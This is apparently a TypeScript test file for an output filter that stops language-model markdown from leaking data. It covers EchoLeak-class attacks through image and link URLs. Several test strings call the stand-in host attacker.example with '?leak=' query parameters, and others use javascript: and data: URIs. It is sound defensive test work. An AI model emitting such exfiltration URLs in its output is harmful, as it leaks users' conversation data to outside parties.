/**
 * 04 — Output-side exfiltration attack/defense tests.
 *
 * Markdown image and link allowlist enforcement. Each test demonstrates the
 * attack (model output emits an exfil URL) alongside the defense (output
 * filter blocks the URL, preserves benign content).
 *
 * See spec/proposals/v0.6-security/04-output-exfiltration.md.
 */
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import { dirname, resolve } from 'node:path';

import { filterMarkdownOutput } from '../../src/security/index.js';

const __dirname = dirname(fileURLToPath(import.meta.url));
const FIXTURE_ROOT = resolve(
  __dirname,
  '../../../bench/fixtures/security/04-output-exfiltration',
);

function load(name: string): string {
  return readFileSync(resolve(FIXTURE_ROOT, name), 'utf8');
}

// ── Markdown image exfiltration (EchoLeak class) ─────────────────────────────

test('attack: markdown image exfil fixture targets attacker.example', () => {
  const md = load('markdown-image-exfil.md');
  assert.ok(
    /!\[\]\(https:\/\/attacker\.example/.test(md),
    'fixture should contain attacker-domain image ref',
  );
  // Body text precedes the exfil — benign content for the defense to preserve.
  assert.ok(md.includes('strong match'));
});

test('defense: empty allowlist blocks all image refs', () => {
  const md = load('markdown-image-exfil.md');
  const { text, blocked, allowed } = filterMarkdownOutput(md);
  assert.equal(blocked.length, 1);
  assert.equal(blocked[0].kind, 'image');
  assert.equal(blocked[0].reason, 'non-allowlisted-domain');
  assert.equal(blocked[0].url.startsWith('https://attacker.example/'), true);
  assert.equal(allowed.length, 0);
  // Body text preserved.
  assert.ok(text.includes('strong match'));
  // Exfil URL replaced with visible blocked-marker, no rendered <img>.
  assert.ok(text.includes('[image blocked: non-allowlisted-domain]'));
  assert.equal(text.includes('attacker.example'), false);
});

test('defense: allowlisting a benign domain passes that domain, strips query', () => {
  const md =
    'Logo: ![](https://cdn.partner.example/logo.png?campaign=tracking)\n\nDone.';
  const { text, blocked, allowed } = filterMarkdownOutput(md, {
    allowedImageHostnames: ['cdn.partner.example'],
  });
  assert.equal(blocked.length, 0);
  assert.equal(allowed.length, 1);
  // Query string stripped (defense-in-depth — exfil can ride in query strings
  // even on allowlisted domains).
  assert.ok(text.includes('https://cdn.partner.example/logo.png'));
  assert.equal(text.includes('campaign=tracking'), false);
});

// ── Markdown link exfiltration ───────────────────────────────────────────────

test('attack: markdown link exfil fixture contains attacker URL in link', () => {
  const md = load('markdown-link-exfil.md');
  assert.ok(/\]\(https:\/\/attacker\.example/.test(md));
  assert.ok(md.includes('canonical reference'));
});

test('defense: empty link allowlist blocks the link, preserves the label', () => {
  const md = load('markdown-link-exfil.md');
  const { text, blocked } = filterMarkdownOutput(md);
  assert.equal(blocked.length, 1);
  assert.equal(blocked[0].kind, 'link');
  assert.equal(blocked[0].reason, 'non-allowlisted-domain');
  // Label text is preserved; href is replaced with a visible blocked-marker
  // that cannot trigger network egress.
  assert.ok(text.includes('Codec v0.6 spec'), 'link label preserved');
  assert.ok(text.includes('#link-blocked-non-allowlisted-domain'));
  assert.equal(text.includes('attacker.example'), false);
});

// ── data: / javascript: URI rejection ────────────────────────────────────────

test('defense: data: URI rejected on images regardless of allowlist', () => {
  const md = '![pixel](data:image/png;base64,iVBORw0KGgoAA==)';
  const { blocked } = filterMarkdownOutput(md, {
    allowedImageHostnames: ['*'], // even with permissive allowlist
  });
  assert.equal(blocked.length, 1);
  assert.equal(blocked[0].reason, 'data-uri');
});

test('defense: javascript: URI rejected on links regardless of allowlist', () => {
  const md = '[bad](javascript:alert(1))';
  const { blocked } = filterMarkdownOutput(md, {
    allowedLinkHostnames: ['*'],
  });
  assert.equal(blocked.length, 1);
  assert.equal(blocked[0].reason, 'javascript-uri');
});

// ── Multiple URLs in one output ──────────────────────────────────────────────

test('defense: mixed allowlisted + blocked URLs handled per-URL', () => {
  const md = `
See [docs](https://docs.partner.example/intro) for the introduction.

But beware ![tracking](https://attacker.example/pixel.gif?leak=context).

Also: [malicious](https://attacker.example/?leak=more).
`;
  const { text, blocked, allowed } = filterMarkdownOutput(md, {
    allowedLinkHostnames: ['docs.partner.example'],
  });
  // 1 link allowed, 1 image blocked, 1 link blocked.
  assert.equal(allowed.length, 1);
  assert.equal(blocked.length, 2);
  assert.ok(text.includes('https://docs.partner.example/intro'));
  assert.ok(text.includes('[image blocked'));
  assert.ok(text.includes('#link-blocked'));
  assert.equal(text.includes('attacker.example'), false);
});

// ── Anchor and relative URLs ─────────────────────────────────────────────────

test('defense: anchor and relative URLs pass without allowlist', () => {
  const md = 'Jump to [section](#section-1) or to [local](/docs/intro).';
  const { blocked, allowed } = filterMarkdownOutput(md);
  assert.equal(blocked.length, 0);
  assert.equal(allowed.length, 2);
});
